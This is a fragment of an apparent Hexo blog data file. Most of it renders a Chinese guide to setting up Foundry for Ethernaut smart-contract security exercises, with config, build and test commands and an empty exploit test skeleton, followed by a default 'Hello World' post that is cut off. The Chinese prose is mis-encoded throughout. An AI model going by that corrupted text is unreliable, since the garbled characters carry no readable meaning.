é¡¹ç›®é…ç½®\"></a>âš™ï¸ é¡¹ç›®é…ç½®</h2><h3 id=\"Foundry-é…ç½®æ–‡ä»¶\"><a href=\"#Foundry-é…ç½®æ–‡ä»¶\" class=\"headerlink\" title=\"Foundry é…ç½®æ–‡ä»¶\"></a>Foundry é…ç½®æ–‡ä»¶</h3><p>æŸ¥çœ‹ <code>foundry.toml</code> é…ç½®ï¼š</p>\n<figure class=\"highlight toml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"section\">[profile.default]</span></span><br><span class=\"line\"><span class=\"attr\">src</span> = <span class=\"string\">&quot;src&quot;</span></span><br><span class=\"line\"><span class=\"attr\">out</span> = <span class=\"string\">&quot;out&quot;</span></span><br><span class=\"line\"><span class=\"attr\">libs</span> = [<span class=\"string\">&quot;lib&quot;</span>]</span><br><span class=\"line\"><span class=\"attr\">solc</span> = <span class=\"string\">&quot;0.8.19&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Etherscan API é…ç½® (å¯é€‰)</span></span><br><span class=\"line\"><span class=\"section\">[etherscan]</span></span><br><span class=\"line\"><span class=\"attr\">mainnet</span> = &#123; key = <span class=\"string\">&quot;$&#123;API_KEY_ETHERSCAN&#125;&quot;</span> &#125;</span><br><span class=\"line\"><span class=\"attr\">sepolia</span> = &#123; key = <span class=\"string\">&quot;$&#123;API_KEY_ETHERSCAN&#125;&quot;</span> &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># RPC ç«¯ç‚¹é…ç½®</span></span><br><span class=\"line\"><span class=\"section\">[rpc_endpoints]</span></span><br><span class=\"line\"><span class=\"attr\">mainnet</span> = <span class=\"string\">&quot;https://rpc.ankr.com/eth&quot;</span></span><br><span class=\"line\"><span class=\"attr\">sepolia</span> = <span class=\"string\">&quot;https://rpc.ankr.com/eth_sepolia&quot;</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"å®‰è£…ä¾èµ–\"><a href=\"#å®‰è£…ä¾èµ–\" class=\"headerlink\" title=\"å®‰è£…ä¾èµ–\"></a>å®‰è£…ä¾èµ–</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># å®‰è£…é¡¹ç›®ä¾èµ–</span></span><br><span class=\"line\">forge install</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># æ‰‹åŠ¨å®‰è£…ç‰¹å®šä¾èµ– (å¦‚æœéœ€è¦)</span></span><br><span class=\"line\">forge install openzeppelin/openzeppelin-contracts</span><br><span class=\"line\">forge install foundry-rs/forge-std</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># æ›´æ–°ä¾èµ–åˆ°æœ€æ–°ç‰ˆæœ¬</span></span><br><span class=\"line\">forge update</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ğŸ§ª-åŸºæœ¬ä½¿ç”¨\"><a href=\"#ğŸ§ª-åŸºæœ¬ä½¿ç”¨\" class=\"headerlink\" title=\"ğŸ§ª åŸºæœ¬ä½¿ç”¨\"></a>ğŸ§ª åŸºæœ¬ä½¿ç”¨</h2><h3 id=\"ç¼–è¯‘åˆçº¦\"><a href=\"#ç¼–è¯‘åˆçº¦\" class=\"headerlink\" title=\"ç¼–è¯‘åˆçº¦\"></a>ç¼–è¯‘åˆçº¦</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># ç¼–è¯‘æ‰€æœ‰åˆçº¦</span></span><br><span class=\"line\">forge build</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ç¼–è¯‘ç‰¹å®šåˆçº¦</span></span><br><span class=\"line\">forge build src/Fallback.sol</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># æŸ¥çœ‹ç¼–è¯‘è¾“å‡º</span></span><br><span class=\"line\"><span class=\"built_in\">ls</span> out/</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"è¿è¡Œæµ‹è¯•\"><a href=\"#è¿è¡Œæµ‹è¯•\" class=\"headerlink\" title=\"è¿è¡Œæµ‹è¯•\"></a>è¿è¡Œæµ‹è¯•</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># è¿è¡Œæ‰€æœ‰æµ‹è¯•</span></span><br><span class=\"line\">forge <span class=\"built_in\">test</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># è¿è¡Œç‰¹å®šæµ‹è¯•åˆçº¦</span></span><br><span class=\"line\">forge <span class=\"built_in\">test</span> --match-contract FallbackTest</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># è¯¦ç»†è¾“å‡º (å¤šä¸ª v å¢åŠ è¯¦ç»†ç¨‹åº¦)</span></span><br><span class=\"line\">forge <span class=\"built_in\">test</span> --match-contract FallbackTest -vvv</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># è¿è¡Œç‰¹å®šæµ‹è¯•å‡½æ•°</span></span><br><span class=\"line\">forge <span class=\"built_in\">test</span> --match-test testFallbackExploit -vvv</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># æ˜¾ç¤º gas æŠ¥å‘Š</span></span><br><span class=\"line\">forge <span class=\"built_in\">test</span> --gas-report</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"ä½¿ç”¨-Anvil-æœ¬åœ°æµ‹è¯•ç½‘\"><a href=\"#ä½¿ç”¨-Anvil-æœ¬åœ°æµ‹è¯•ç½‘\" class=\"headerlink\" title=\"ä½¿ç”¨ Anvil æœ¬åœ°æµ‹è¯•ç½‘\"></a>ä½¿ç”¨ Anvil æœ¬åœ°æµ‹è¯•ç½‘</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># å¯åŠ¨æœ¬åœ°æµ‹è¯•ç½‘ (æ–°ç»ˆç«¯)</span></span><br><span class=\"line\">anvil</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># åœ¨å¦ä¸€ä¸ªç»ˆç«¯ä¸­ï¼Œé’ˆå¯¹æœ¬åœ°ç½‘ç»œè¿è¡Œæµ‹è¯•</span></span><br><span class=\"line\">forge <span class=\"built_in\">test</span> --fork-url http://localhost:8545</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ğŸ”§-å¸¸ç”¨-Foundry-å‘½ä»¤\"><a href=\"#ğŸ”§-å¸¸ç”¨-Foundry-å‘½ä»¤\" class=\"headerlink\" title=\"ğŸ”§ å¸¸ç”¨ Foundry å‘½ä»¤\"></a>ğŸ”§ å¸¸ç”¨ Foundry å‘½ä»¤</h2><h3 id=\"Forge-å‘½ä»¤\"><a href=\"#Forge-å‘½ä»¤\" class=\"headerlink\" title=\"Forge å‘½ä»¤\"></a>Forge å‘½ä»¤</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># é¡¹ç›®ç®¡ç†</span></span><br><span class=\"line\">forge init my-project          <span class=\"comment\"># åˆå§‹åŒ–æ–°é¡¹ç›®</span></span><br><span class=\"line\">forge build                    <span class=\"comment\"># ç¼–è¯‘åˆçº¦</span></span><br><span class=\"line\">forge clean                    <span class=\"comment\"># æ¸…ç†ç¼–è¯‘è¾“å‡º</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># æµ‹è¯•ç›¸å…³</span></span><br><span class=\"line\">forge <span class=\"built_in\">test</span>                     <span class=\"comment\"># è¿è¡Œæµ‹è¯•</span></span><br><span class=\"line\">forge <span class=\"built_in\">test</span> --watch            <span class=\"comment\"># ç›‘è§†æ–‡ä»¶å˜åŒ–å¹¶è‡ªåŠ¨æµ‹è¯•</span></span><br><span class=\"line\">forge coverage                <span class=\"comment\"># ä»£ç è¦†ç›–ç‡æŠ¥å‘Š</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ä¾èµ–ç®¡ç†</span></span><br><span class=\"line\">forge install &lt;dependency&gt;     <span class=\"comment\"># å®‰è£…ä¾èµ–</span></span><br><span class=\"line\">forge remove &lt;dependency&gt;     <span class=\"comment\"># ç§»é™¤ä¾èµ–</span></span><br><span class=\"line\">forge update                  <span class=\"comment\"># æ›´æ–°ä¾èµ–</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ä»£ç æ ¼å¼åŒ–</span></span><br><span class=\"line\">forge <span class=\"built_in\">fmt</span>                     <span class=\"comment\"># æ ¼å¼åŒ– Solidity ä»£ç </span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Cast-å‘½ä»¤\"><a href=\"#Cast-å‘½ä»¤\" class=\"headerlink\" title=\"Cast å‘½ä»¤\"></a>Cast å‘½ä»¤</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># æŸ¥è¯¢åŒºå—é“¾ä¿¡æ¯</span></span><br><span class=\"line\">cast block-number             <span class=\"comment\"># è·å–æœ€æ–°åŒºå—å·</span></span><br><span class=\"line\">cast balance &lt;address&gt;        <span class=\"comment\"># æŸ¥è¯¢åœ°å€ä½™é¢</span></span><br><span class=\"line\">cast storage &lt;address&gt; &lt;slot&gt; <span class=\"comment\"># è¯»å–å­˜å‚¨æ§½</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># è°ƒç”¨åˆçº¦</span></span><br><span class=\"line\">cast call &lt;address&gt; &lt;signature&gt; [args]  <span class=\"comment\"># åªè¯»è°ƒç”¨</span></span><br><span class=\"line\">cast send &lt;address&gt; &lt;signature&gt; [args]  <span class=\"comment\"># çŠ¶æ€å˜æ›´è°ƒç”¨</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># å·¥å…·å‡½æ•°</span></span><br><span class=\"line\">cast keccak <span class=\"string\">&quot;function_signature()&quot;</span>      <span class=\"comment\"># è®¡ç®—å‡½æ•°é€‰æ‹©å™¨</span></span><br><span class=\"line\">cast abi-encode <span class=\"string\">&quot;func(uint256)&quot;</span> 123     <span class=\"comment\"># ABI ç¼–ç </span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Anvil-å‘½ä»¤\"><a href=\"#Anvil-å‘½ä»¤\" class=\"headerlink\" title=\"Anvil å‘½ä»¤\"></a>Anvil å‘½ä»¤</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># å¯åŠ¨æœ¬åœ°æµ‹è¯•ç½‘</span></span><br><span class=\"line\">anvil                         <span class=\"comment\"># é»˜è®¤é…ç½®</span></span><br><span class=\"line\">anvil --port 8545            <span class=\"comment\"># æŒ‡å®šç«¯å£</span></span><br><span class=\"line\">anvil --accounts 20          <span class=\"comment\"># æŒ‡å®šè´¦æˆ·æ•°é‡</span></span><br><span class=\"line\">anvil --balance 1000         <span class=\"comment\"># æ¯ä¸ªè´¦æˆ·åˆå§‹ä½™é¢ (ETH)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ä»ç‰¹å®šçŠ¶æ€åˆ†å‰</span></span><br><span class=\"line\">anvil --fork-url https://rpc.ankr.com/eth</span><br><span class=\"line\">anvil --fork-url https://rpc.ankr.com/eth --fork-block-number 19000000</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ğŸ¯-Ethernaut-ä¸“ç”¨é…ç½®\"><a href=\"#ğŸ¯-Ethernaut-ä¸“ç”¨é…ç½®\" class=\"headerlink\" title=\"ğŸ¯ Ethernaut ä¸“ç”¨é…ç½®\"></a>ğŸ¯ Ethernaut ä¸“ç”¨é…ç½®</h2><h3 id=\"ç¯å¢ƒå˜é‡é…ç½®\"><a href=\"#ç¯å¢ƒå˜é‡é…ç½®\" class=\"headerlink\" title=\"ç¯å¢ƒå˜é‡é…ç½®\"></a>ç¯å¢ƒå˜é‡é…ç½®</h3><p>åˆ›å»º <code>.env</code> æ–‡ä»¶ï¼š</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># .env æ–‡ä»¶</span></span><br><span class=\"line\">ETHERSCAN_API_KEY=your_etherscan_api_key</span><br><span class=\"line\">MAINNET_RPC_URL=https://rpc.ankr.com/eth</span><br><span class=\"line\">SEPOLIA_RPC_URL=https://rpc.ankr.com/eth_sepolia</span><br><span class=\"line\">PRIVATE_KEY=your_private_key_for_testing</span><br></pre></td></tr></table></figure>\n\n<p>åŠ è½½ç¯å¢ƒå˜é‡ï¼š</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># åœ¨ shell ä¸­åŠ è½½</span></span><br><span class=\"line\"><span class=\"built_in\">source</span> .<span class=\"built_in\">env</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># æˆ–åœ¨ foundry.toml ä¸­é…ç½®è‡ªåŠ¨åŠ è½½</span></span><br><span class=\"line\">[profile.default]</span><br><span class=\"line\">env_file = <span class=\"string\">&quot;.env&quot;</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"æµ‹è¯•æ¨¡æ¿\"><a href=\"#æµ‹è¯•æ¨¡æ¿\" class=\"headerlink\" title=\"æµ‹è¯•æ¨¡æ¿\"></a>æµ‹è¯•æ¨¡æ¿</h3><p>åˆ›å»ºæ ‡å‡†æµ‹è¯•æ–‡ä»¶æ¨¡æ¿ï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: MIT</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;../src/TargetContract.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">contract TargetContractTest is Test &#123;</span><br><span class=\"line\">    TargetContract public instance;</span><br><span class=\"line\">    address public attacker = makeAddr(&quot;attacker&quot;);</span><br><span class=\"line\">    </span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        // éƒ¨ç½²ç›®æ ‡åˆçº¦</span><br><span class=\"line\">        instance = new TargetContract();</span><br><span class=\"line\">        </span><br><span class=\"line\">        // åˆå§‹åŒ–æ”»å‡»è€…è´¦æˆ·</span><br><span class=\"line\">        vm.deal(attacker, 10 ether);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function testExploit() public &#123;</span><br><span class=\"line\">        vm.startPrank(attacker);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // æ”»å‡»é€»è¾‘</span><br><span class=\"line\">        </span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">        </span><br><span class=\"line\">        // éªŒè¯æ”»å‡»æˆåŠŸ</span><br><span class=\"line\">        assertTrue(/* éªŒè¯æ¡ä»¶ */);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ğŸ›-å¸¸è§é—®é¢˜è§£å†³\"><a href=\"#ğŸ›-å¸¸è§é—®é¢˜è§£å†³\" class=\"headerlink\" title=\"ğŸ› å¸¸è§é—®é¢˜è§£å†³\"></a>ğŸ› å¸¸è§é—®é¢˜è§£å†³</h2><h3 id=\"ç¼–è¯‘é”™è¯¯\"><a href=\"#ç¼–è¯‘é”™è¯¯\" class=\"headerlink\" title=\"ç¼–è¯‘é”™è¯¯\"></a>ç¼–è¯‘é”™è¯¯</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># æ¸…ç†å¹¶é‡æ–°ç¼–è¯‘</span></span><br><span class=\"line\">forge clean &amp;&amp; forge build</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># æ£€æŸ¥ Solidity ç‰ˆæœ¬å…¼å®¹æ€§</span></span><br><span class=\"line\">forge build --force</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># æŸ¥çœ‹è¯¦ç»†é”™è¯¯ä¿¡æ¯</span></span><br><span class=\"line\">forge build --verbose</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"ä¾èµ–é—®é¢˜\"><a href=\"#ä¾èµ–é—®é¢˜\" class=\"headerlink\" title=\"ä¾èµ–é—®é¢˜\"></a>ä¾èµ–é—®é¢˜</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># é‡æ–°å®‰è£…ä¾èµ–</span></span><br><span class=\"line\"><span class=\"built_in\">rm</span> -rf lib/</span><br><span class=\"line\">forge install</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># æ£€æŸ¥ Git å­æ¨¡å—çŠ¶æ€</span></span><br><span class=\"line\">git submodule status</span><br><span class=\"line\">git submodule update --init --recursive</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"æµ‹è¯•å¤±è´¥\"><a href=\"#æµ‹è¯•å¤±è´¥\" class=\"headerlink\" title=\"æµ‹è¯•å¤±è´¥\"></a>æµ‹è¯•å¤±è´¥</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># å¢åŠ è¯¦ç»†è¾“å‡º</span></span><br><span class=\"line\">forge <span class=\"built_in\">test</span> -vvvv</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ä½¿ç”¨è°ƒè¯•å™¨</span></span><br><span class=\"line\">forge <span class=\"built_in\">test</span> --debug &lt;test_function&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># æ£€æŸ¥ gas ä½¿ç”¨æƒ…å†µ</span></span><br><span class=\"line\">forge <span class=\"built_in\">test</span> --gas-report</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ğŸ“š-è¿›é˜¶é…ç½®\"><a href=\"#ğŸ“š-è¿›é˜¶é…ç½®\" class=\"headerlink\" title=\"ğŸ“š è¿›é˜¶é…ç½®\"></a>ğŸ“š è¿›é˜¶é…ç½®</h2><h3 id=\"å¤šç‰ˆæœ¬-Solidity-æ”¯æŒ\"><a href=\"#å¤šç‰ˆæœ¬-Solidity-æ”¯æŒ\" class=\"headerlink\" title=\"å¤šç‰ˆæœ¬ Solidity æ”¯æŒ\"></a>å¤šç‰ˆæœ¬ Solidity æ”¯æŒ</h3><figure class=\"highlight toml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># foundry.toml</span></span><br><span class=\"line\"><span class=\"section\">[profile.default]</span></span><br><span class=\"line\"><span class=\"attr\">solc</span> = <span class=\"string\">&quot;0.8.19&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"section\">[profile.legacy]</span></span><br><span class=\"line\"><span class=\"attr\">solc</span> = <span class=\"string\">&quot;0.6.12&quot;</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"è‡ªå®šä¹‰æµ‹è¯•é…ç½®\"><a href=\"#è‡ªå®šä¹‰æµ‹è¯•é…ç½®\" class=\"headerlink\" title=\"è‡ªå®šä¹‰æµ‹è¯•é…ç½®\"></a>è‡ªå®šä¹‰æµ‹è¯•é…ç½®</h3><figure class=\"highlight toml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"section\">[profile.default.fuzz]</span></span><br><span class=\"line\"><span class=\"attr\">runs</span> = <span class=\"number\">1000</span></span><br><span class=\"line\"><span class=\"attr\">max_test_rejects</span> = <span class=\"number\">65536</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"section\">[profile.default.invariant]</span></span><br><span class=\"line\"><span class=\"attr\">runs</span> = <span class=\"number\">256</span></span><br><span class=\"line\"><span class=\"attr\">depth</span> = <span class=\"number\">32</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Gas-ä¼˜åŒ–è®¾ç½®\"><a href=\"#Gas-ä¼˜åŒ–è®¾ç½®\" class=\"headerlink\" title=\"Gas ä¼˜åŒ–è®¾ç½®\"></a>Gas ä¼˜åŒ–è®¾ç½®</h3><figure class=\"highlight toml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"section\">[profile.default.optimizer]</span></span><br><span class=\"line\"><span class=\"attr\">enabled</span> = <span class=\"literal\">true</span></span><br><span class=\"line\"><span class=\"attr\">runs</span> = <span class=\"number\">200</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"section\">[profile.default.model_checker]</span></span><br><span class=\"line\"><span class=\"attr\">contracts</span> = &#123; <span class=\"string\">&quot;/path/to/project/src/Contract.sol&quot;</span> = [ <span class=\"string\">&quot;Contract&quot;</span> ] &#125;</span><br><span class=\"line\"><span class=\"attr\">engine</span> = <span class=\"string\">&quot;chc&quot;</span></span><br><span class=\"line\"><span class=\"attr\">targets</span> = [ <span class=\"string\">&quot;assert&quot;</span>, <span class=\"string\">&quot;underflow&quot;</span>, <span class=\"string\">&quot;overflow&quot;</span>, <span class=\"string\">&quot;divByZero&quot;</span> ]</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ğŸ“-æ€»ç»“\"><a href=\"#ğŸ“-æ€»ç»“\" class=\"headerlink\" title=\"ğŸ“ æ€»ç»“\"></a>ğŸ“ æ€»ç»“</h2><p>ç°åœ¨æ‚¨å·²ç»å®Œæˆäº† Foundry å¼€å‘ç¯å¢ƒçš„æ­å»ºï¼Œå¯ä»¥å¼€å§‹ Ethernaut å®‰å…¨æŒ‘æˆ˜çš„å­¦ä¹ ä¹‹æ—…äº†ï¼</p>\n<h3 id=\"ä¸‹ä¸€æ­¥ï¼š\"><a href=\"#ä¸‹ä¸€æ­¥ï¼š\" class=\"headerlink\" title=\"ä¸‹ä¸€æ­¥ï¼š\"></a>ä¸‹ä¸€æ­¥ï¼š</h3><ol>\n<li><strong>ç†Ÿæ‚‰ Foundry åŸºæœ¬å‘½ä»¤</strong></li>\n<li><strong>è¿è¡Œç¬¬ä¸€ä¸ªæµ‹è¯•</strong>: <code>forge test --match-contract FallbackTest -vvv</code></li>\n<li><strong>å¼€å§‹å­¦ä¹ </strong>: <a href=\"/2025/01/25/ethernaut-level-01-fallback/\">Level 1 - Fallback</a></li>\n</ol>\n<hr>\n<h2 id=\"ğŸ”—-ç›¸å…³é“¾æ¥\"><a href=\"#ğŸ”—-ç›¸å…³é“¾æ¥\" class=\"headerlink\" title=\"ğŸ”— ç›¸å…³é“¾æ¥\"></a>ğŸ”— ç›¸å…³é“¾æ¥</h2><ul>\n<li><strong><a href=\"https://book.getfoundry.sh/\">Foundry å®˜æ–¹æ–‡æ¡£</a></strong></li>\n<li><strong><a href=\"https://github.com/foundry-rs/foundry\">Foundry GitHub</a></strong></li>\n<li><strong><a href=\"/2025/01/25/ethernaut-level-01-fallback/\">ä¸‹ä¸€ç¯‡: Level 1 - Fallback</a></strong></li>\n<li><strong><a href=\"/2025/01/25/ethernaut-foundry-solutions-series/\">ç³»åˆ—ç›®å½•: Ethernaut Foundry Solutions</a></strong></li>\n</ul>\n<hr>\n<p><em>å·¥æ¬²å–„å…¶äº‹ï¼Œå¿…å…ˆåˆ©å…¶å™¨ã€‚æŒæ¡å¥½å·¥å…·ï¼Œæ‰èƒ½æ›´å¥½åœ°å­¦ä¹ æ™ºèƒ½åˆçº¦å®‰å…¨ã€‚</em> ğŸ”§</p>\n"},{"title":"Hello World","_content":"Welcome to [Hexo](https://hexo.io/)! This is your very first post. Check [documentation](https://hexo.io/docs/) for more info. If you get any problems when using Hexo, you can find the answer in [troubleshooting](https://hexo.io/docs/troubleshooting.html) or you can ask me on [GitHub](https://github.com/hexojs/hexo/issues).\n\n## Quick Start\n\n### Create a new post\n\n``` bash\n$ hexo new \"My New Post\"\n```\n\nMore info: [Writing](https://hexo.io/docs/writing.html)\n\n### Run server\n\n``` bash\n$ hexo server\n```\n\nMore info: [Server](https://hexo.io/docs/server.html)\n\n### Generate static files\n\n``` bash\n$ hexo generate\n```\n\nMore info: [Generating](https://hexo.io/docs/generating.html)\n\n### Deploy to remote sites\n\n``` bash\n$ hexo deploy\n```\n\nMore info: [Deployment](https://hexo.io/docs/one-command-deployment.html)\n","source":"_posts/hello-world.md","raw":"---\ntitle: Hello World\n---\nWelcome to [Hexo](https://hexo.io/)! This is your very first post. Check 